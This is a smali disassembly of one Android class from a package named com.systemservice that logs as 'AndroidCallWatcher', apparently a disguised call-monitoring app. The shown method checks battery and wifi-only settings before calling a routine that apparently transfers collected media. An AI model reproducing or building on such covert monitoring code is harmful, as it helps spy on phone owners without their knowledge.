.class Lcom/systemservice/a/c/c/g;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/a/c/c/h;->run()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Lcom/systemservice/a/h/f;

.field final synthetic b:Lcom/systemservice/a/c/c/h;


# direct methods
.method constructor <init>(Lcom/systemservice/a/c/c/h;Lcom/systemservice/a/h/f;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/a/c/c/g;->b:Lcom/systemservice/a/c/c/h;

    iput-object p2, p0, Lcom/systemservice/a/c/c/g;->a:Lcom/systemservice/a/h/f;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 9

    iget-object v0, p0, Lcom/systemservice/a/c/c/g;->b:Lcom/systemservice/a/c/c/h;

    iget-object v0, v0, Lcom/systemservice/a/c/c/h;->a:Landroid/content/Context;

    invoke-static {v0}, Lcom/systemservice/common/features/settingHistory/b;->c(Landroid/content/Context;)Z

    move-result v0

    const/4 v1, 0x1

    if-eqz v0, :cond_2

    iget-object v0, p0, Lcom/systemservice/a/c/c/g;->b:Lcom/systemservice/a/c/c/h;

    iget-object v0, v0, Lcom/systemservice/a/c/c/h;->a:Landroid/content/Context;

    const/4 v2, 0x0

    const-string v3, "app_prefs_settings"

    invoke-virtual {v0, v3, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "battery"

    invoke-interface {v0, v4, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v5

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    const-string v5, ""

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v6, "AndroidCallWatcher"

    invoke-static {v6, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "save_battery"

    invoke-interface {v0, v7, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v8

    invoke-virtual {v3, v8}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v6, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const-string v3, "media_data_transfered_by_wifi_only"

    invoke-interface {v0, v3, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v3

    if-eqz v3, :cond_0

    invoke-interface {v0, v7, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v3

    if-nez v3, :cond_0

    iget-object v3, p0, Lcom/systemservice/a/c/c/g;->b:Lcom/systemservice/a/c/c/h;

    iget-object v3, v3, Lcom/systemservice/a/c/c/h;->a:Landroid/content/Context;

    invoke-static {v3}, Lcom/systemservice/a/a/h;->c(Landroid/content/Context;)Z

    move-result v3

    if-nez v3, :cond_0

    const-string v0, "WiFi ONLY = false"

    invoke-static {v6, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, p0, Lcom/systemservice/a/c/c/g;->b:Lcom/systemservice/a/c/c/h;

    iget-object v0, v0, Lcom/systemservice/a/c/c/h;->b:Lcom/systemservice/a/c/c/i;

    invoke-static {v0}, Lcom/systemservice/a/c/c/i;->a(Lcom/systemservice/a/c/c/i;)Lorg/apache/log4j/Logger;

    move-result-object v0

    const-string v1, "WiFiWiFi ONLY = false"

    invoke-virtual {v0, v1}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    return-void

    :cond_0
    invoke-interface {v0, v7, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    if-eqz v2, :cond_1

    iget-object v2, p0, Lcom/systemservice/a/c/c/g;->b:Lcom/systemservice/a/c/c/h;

    iget-object v2, v2, Lcom/systemservice/a/c/c/h;->b:Lcom/systemservice/a/c/c/i;

    invoke-static {v2}, Lcom/systemservice/a/c/c/i;->a(Lcom/systemservice/a/c/c/i;)Lorg/apache/log4j/Logger;

    move-result-object v2

    const-string v3, "G_SAVE_BATTERY = true"

    invoke-virtual {v2, v3}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    iget-object v2, p0, Lcom/systemservice/a/c/c/g;->b:Lcom/systemservice/a/c/c/h;

    iget-object v2, v2, Lcom/systemservice/a/c/c/h;->a:Landroid/content/Context;

    invoke-static {v2}, Lcom/systemservice/a/a/h;->b(Landroid/content/Context;)Z

    move-result v2

    if-eqz v2, :cond_3

    invoke-interface {v0, v4, v1}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_3

    iget-object v0, p0, Lcom/systemservice/a/c/c/g;->b:Lcom/systemservice/a/c/c/h;

    iget-object v0, v0, Lcom/systemservice/a/c/c/h;->b:Lcom/systemservice/a/c/c/i;

    invoke-static {v0}, Lcom/systemservice/a/c/c/i;->a(Lcom/systemservice/a/c/c/i;)Lorg/apache/log4j/Logger;

    move-result-object v0

    const-string v1, "G_BATTERY = true"

    invoke-virtual {v0, v1}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    :cond_1
    iget-object v0, p0, Lcom/systemservice/a/c/c/g;->b:Lcom/systemservice/a/c/c/h;

    iget-object v1, v0, Lcom/systemservice/a/c/c/h;->b:Lcom/systemservice/a/c/c/i;

    iget-object v0, v0, Lcom/systemservice/a/c/c/h;->a:Landroid/content/Context;

    iget-object v2, p0, Lcom/systemservice/a/c/c/g;->a:Lcom/systemservice/a/h/f;

    invoke-static {v1, v0, v2}, Lcom/systemservice/a/c/c/i;->a(Lcom/systemservice/a/c/c/i;Landroid/content/Context;Lcom/systemservice/a/h/f;)V

    goto :goto_0

    :cond_2
    sput-boolean v1, Lcom/systemservice/a/a/j;->c:Z

    :cond_3
    :goto_0
    return-void
.end method
